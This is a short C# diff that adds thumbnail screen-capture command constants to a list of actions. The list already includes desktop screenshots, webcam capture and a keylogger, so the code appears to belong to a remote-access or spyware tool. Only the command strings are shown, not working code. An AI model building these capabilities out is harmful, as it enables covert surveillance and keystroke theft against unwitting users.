@@ -10,6 +10,9 @@
 
         public static class ACTION_TYPE
         {
+            public static readonly string THUMBNAIL_SCREEN_START = "/ACTION=THUMBNAIL_SCREEN_START";
+            public static readonly string THUMBNAIL_SCREEN_STOP = "/ACTION=THUMBNAIL_SCREEN_STOP";
+            public static readonly string THUMBNAIL_SCREEN_REPORT = "/ACTION=THUMBNAIL_SCREEN_REPORT";
             public static readonly string TAKE_DESKTOP_SCREEN = "/ACTION=TAKE_DESKTOP_SCREEN";
             public static readonly string TAKE_WEBCAM_SCREEN = "/ACTION=TAKE_WEBCAM_SCREEN";
             public static readonly string KEYLOGGER_START = "/ACTION=KEYLOGGER_START";
